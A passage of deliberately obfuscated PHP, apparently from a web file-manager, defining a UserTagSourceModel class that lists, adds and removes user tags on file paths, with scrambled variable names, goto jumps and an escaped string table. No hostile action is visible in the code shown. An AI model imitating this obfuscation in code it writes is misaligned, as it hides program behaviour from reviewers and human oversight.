($EğÕÉÑâÇÜ[$eÂÇ¬©½“‡[1749]] - 1); $D–ƒ¹½«‰ö += $EğÕÉÑâÇÜ[$eÂÇ¬©½“‡[1749]]; } } $Bè‰Ñ¡’Ñí = array($eÂÇ¬©½“‡[1755] => $C­›ğ½Ô±, $eÂÇ¬©½“‡[1756] => $A½ºñ‘¿š, $eÂÇ¬©½“‡[1757] => $A½ºñ‘¿š / $C­›ğ½Ô±, $eÂÇ¬©½“‡[82] => $bƒˆ†Í•ÒØ, $eÂÇ¬©½“‡[1758] => $D–ƒ¹½«‰ö); return $Bè‰Ñ¡’Ñí; goto FŠŸ…Ó”; B„™ö—è‚: $eÂÇ¬©½“‡ =& $_SERVER[Ç³Íß¦Ó]; $bƒˆ†Í•ÒØ = $this->count() + 0.0; $A½ºñ‘¿š = 0; goto E°‚¥Ü—ÜŠ; E°‚¥Ü—ÜŠ: $C­›ğ½Ô± = 1; $D–ƒ¹½«‰ö = 0; $f‹‹†Œè‚ = 5000; goto D’á¯ö¬„®; FŠŸ…Ó”: } } goto cÜè»ó¸ùâ; c§à‘‘‚”à: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\137\x66\x61\166"; protected function cacheFunctionAlias($EÒ§­­áò¬) { $A‡×Ë†Êô• =& $_SERVER[Ç³Íß¦Ó]; return array($A‡×Ë†Êô•[1791] => array(USER_ID, $A‡×Ë†Êô•[1792])); } protected function listData() { $Eçİ˜–¤†© =& $_SERVER[Ç³Íß¦Ó]; $f›éÖé ÃÑ = array($Eçİ˜–¤†©[1518] => USER_ID, $Eçİ˜–¤†©[461] => array($Eçİ˜–¤†©[1795], 0)); $cÔéñ­™ã¸ = $Eçİ˜–¤†©[1797]; $d‘³íŒÏ‰É = $this->field($cÔéñ­™ã¸)->where($f›éÖé ÃÑ)->order($Eçİ˜–¤†©[1798])->select(); return $d‘³íŒÏ‰É ? $d‘³íŒÏ‰É : array(); } protected function listByTag($e¢µï‡œè§) { } protected function addToTag($FÔëºô¬—¶, $c²ïº×˜·Ñ) { $EäŒâ™¤‹ã =& $_SERVER[Ç³Íß¦Ó]; if (!Model($EäŒâ™¤‹ã[1933])->listData($c²ïº×˜·Ñ) || !Model($EäŒâ™¤‹ã[791])->pathInfo($FÔëºô¬—¶)) { return !1; } $cµìİĞÓíò = array($EäŒâ™¤‹ã[1518] => USER_ID, $EäŒâ™¤‹ã[461] => $c²ïº×˜·Ñ, $EäŒâ™¤‹ã[412] => $FÔëºô¬—¶, $EäŒâ™¤‹ã[413] => $EäŒâ™¤‹ã[407], $EäŒâ™¤‹ã[411] => $EäŒâ™¤‹ã[33], $EäŒâ™¤‹ã[1693] => 0); if ($this->where($cµìİĞÓíò)->find()) { return !1; } return $this->add($cµìİĞÓíò); } protected function removeFromTag($bÑÇª‹¼Ù, $F“ª’½ÔÜÉ) { $FÇº½»êÙ =& $_SERVER[Ç³Íß¦Ó]; if (!Model($FÇº½»êÙ[1933])->listData($F“ª’½ÔÜÉ)) { return !1; } if (is_array($bÑÇª‹¼Ù)) { $bÑÇª‹¼Ù = array($FÇº½»êÙ[7], $bÑÇª‹¼Ù); } $cß”›Ë³×‰ = array($FÇº½»êÙ[1518] => USER_ID, $FÇº½»êÙ[461] => $F“ª’½ÔÜÉ, $FÇº½»êÙ[413] => $FÇº½»êÙ[407], $FÇº½»êÙ[412] => $bÑÇª‹¼Ù); return $this->where($cß”›Ë³×‰)->delete(); } protected function removeByTag($B„ ’„‹) { $C¯‚È”ÃÈí =& $_SERVER[Ç³Íß¦Ó]; if (!$B„ ’„‹) { return !1; } $dò·‡Ğ¸ = array($C¯‚È”ÃÈí[1518] => USER_ID, $C¯‚È”ÃÈí[461] => $B„ ’„‹); return $this->where($dò·‡Ğ¸)->delete(); } protected function removeBySource($A¹ Ù¥ˆö) { $dë³õ¥§ï =& $_SERVER[Ç³Íß¦Ó]; if (is_array($A¹ Ù¥ˆö)) { $A¹ Ù¥ˆö = array($dë³õ¥§ï[7], $A¹ Ù¥ˆö); } $cÄŠóäîôÊ = array($dë³õ¥§ï[1518] => USER_ID, $dë³õ¥§ï[412] => $A¹ Ù¥ˆö, $dë³õ¥§ï[461] => array($dë³õ¥§ï[971], 0)); return $this->where($cÄŠóäîôÊ)->delete(); } }